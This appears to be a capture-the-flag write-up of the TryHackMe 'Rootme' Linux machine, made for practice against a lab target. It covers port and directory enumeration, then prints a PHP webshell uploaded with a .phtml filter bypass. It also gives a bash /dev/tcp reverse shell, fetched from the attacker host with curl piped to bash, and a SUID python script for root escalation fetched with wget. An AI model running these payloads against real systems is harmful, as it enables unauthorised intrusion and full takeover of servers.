# Rootme

## 1. Introduction

### 1.1 Background

**Rootme** is an _Easy_ Linux machine on the **TryHackMe** platform, focused on practicing basic enumeration techniques, web exploitation, and privilege escalation in Linux environments.

### 1.2 Objectives

- Identify exposed services.
- Enumerate the web application.
- Obtain remote access to the system.
- Escalate privileges to **root**.

---

## 2. Enumeration

### 2.1 Initial Reconnaissance

We begin by identifying the target IP and verifying connectivity:

```bash
❯ ping -c 1 10.48.147.3
```

The host responds correctly, confirming it is active.

### 2.2 Nmap

We perform a full port scan:

```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 10.48.147.3 -oN allports --open
```

### Open ports:

- **22/tcp** → SSH  
- **80/tcp** → HTTP  

Detailed scan:

```bash
❯ nmap -p22,80 -sCV -Pn -oN targeted 10.48.147.3
```

Important findings:

- **OpenSSH 8.2p1 (Ubuntu)**  
- **Apache 2.4.41 (Ubuntu)**  
- Cookie `PHPSESSID` without `HttpOnly` flag  
- Site title: **HackIT - Home**  

### 2.3 Web Enumeration

We access:

```
http://10.48.147.3/
```

The main page of the site is observed.

![[Pasted image 20260223193559.png]]

We use:

```bash
❯ wfuzz -c --hc 403,404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.48.147.3/FUZZ
```

### Discovered directories:

- `/uploads`  
- `/panel`  

## 3. Exploitation

### 3.1 Uploading a Malicious .php File

In `/panel`, file upload was allowed.

A basic webshell was created:

```php
<?php echo system($_GET["cmd"]); ?>
```

Initially, `.php` files were not allowed, so it was renamed to:

```
webshell.phtml
```

The file was successfully accepted.

We verify in:

```
/uploads
```

Accessing:

```
http://10.48.147.3/uploads/webshell.phtml?cmd=id
```

Result:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmation of remote command execution (RCE).

### 3.2 Obtaining Reverse Shell

A script was created to establish a reverse connection.

On the attacker machine:

```bash
❯ mkdir server  
❯ cd server
```

The file `index.html` was created:

```
#!/bin/bash  
bash -i >& /dev/tcp/192.168.139.228/8080 0>&1
```

HTTP server started:

```bash
❯ python3 -m http.server 8001
```

Listener:

```bash
❯ nc -lvnp 8080
```

From the victim:

```
http://10.48.147.3/uploads/webshell.phtml?cmd=curl%20192.168.139.228:8001%20|%20bash
```

Shell obtained as:

```
www-data
```

## 4. Post-Exploitation

### 4.1 Searching for SUID Binaries

After gaining access to the system:

```bash
❯ find / -perm -u=s -type f 2>/dev/null
```

Found:

```
/usr/bin/python
```

Python with SUID bit enabled.

### 4.2 Privilege Escalation

On the attacker machine, the following was created:

```python
import os  
os.setuid(0)  
os.system('bash')
```

It was served again via HTTP and from the victim:

```bash
❯ wget 192.168.139.228:8001/hackeo.py  
❯ python hackeo.py
```

Result:

```
root
```
